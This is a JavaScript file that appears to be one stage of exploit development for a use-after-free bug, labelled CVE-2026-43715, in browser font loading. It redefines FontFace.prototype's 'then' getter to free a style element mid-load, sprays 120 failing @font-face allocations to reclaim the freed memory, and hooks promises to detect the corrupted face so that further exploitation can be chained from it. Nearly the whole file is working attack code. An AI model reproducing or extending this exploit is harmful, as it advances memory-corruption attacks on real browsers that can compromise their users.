// p452 — CVE-2026-43715 Stage 2: live flip hook — the UAF callback
// resolving a FontFace promise in JS
// Beacon prefix: V452-
//
// p451: 18/25 runs flip spray face t1x1 (position 1, round 1) to
// "loaded" — the type-confused fontLoaded(success) from the trigger's
// load lands on the second sprayed allocation. No other face ever
// flips.
//
// p452 hooks it live: after the trigger resolves, attach .loaded.then
// to every round-0 sprayed face. Failing-src faces never load on their
// own, so their loaded promises stay pending forever — whichever one
// fires (or is already resolved) is the face the UAF callback touched,
// delivered as a JS promise event. That converts the corruption into a
// JS-visible trigger we can chain from.
//
// Single round: the flip is a first-trigger phenomenon (p451 R1+
// censuses never showed a t2x1 flip).

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V452-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  window.onerror = function(msg, src, line, col) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 100));
    return false;
  };

  var OK = 'local(Helvetica)';
  var BAD = 'local(Songti)';
  var hits = 0;

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      hits++;
      B('THEN-' + hits);
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here

        for (var k = 0; k < 120; k++) {
          var fam = 't1x' + k;
          var st = document.createElement('style');
          st.textContent = '@font-face { font-family: ' + fam +
            '; src: ' + BAD + '; }';
          document.head.appendChild(st);
          var d = document.createElement('div');
          d.style.fontFamily = fam;
          d.textContent = 'A';
          document.body.appendChild(d);
          document.body.offsetHeight;
        }
      }
      return undefined;
    },
    configurable: true
  });
  B('GETTER-SET');

  function findFace(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function hook() {
    var hooked = 0;
    for (var k = 0; k < 120; k++) {
      var f = findFace('t1x' + k);
      if (!f) continue;
      hooked++;
      (function(face, fam) {
        face.loaded.then(
          function() { B('FIRED-' + fam + '-S' + face.status); },
          function(e) { B('REJECTED-' + fam); }
        );
      })(f, 't1x' + k);
    }
    B('HOOKED-' + hooked);
  }

  function round0() {
    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: g0; src: ' + OK + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var face = findFace('g0');
    if (!face) { B('NOFACE'); return; }

    void face.loaded;
    B('LOAD-0');

    face.load().then(
      function() {
        B('SURVIVED-0-H' + hits);
        hook();                          // attach to all sprayed faces now
      },
      function(e) { B('NO-0-' + encodeURIComponent(String(e)).slice(0, 60)); }
    );
  }

  round0();
  setTimeout(function() { B('ALIVE-5S-H' + hits); }, 5000);
})();
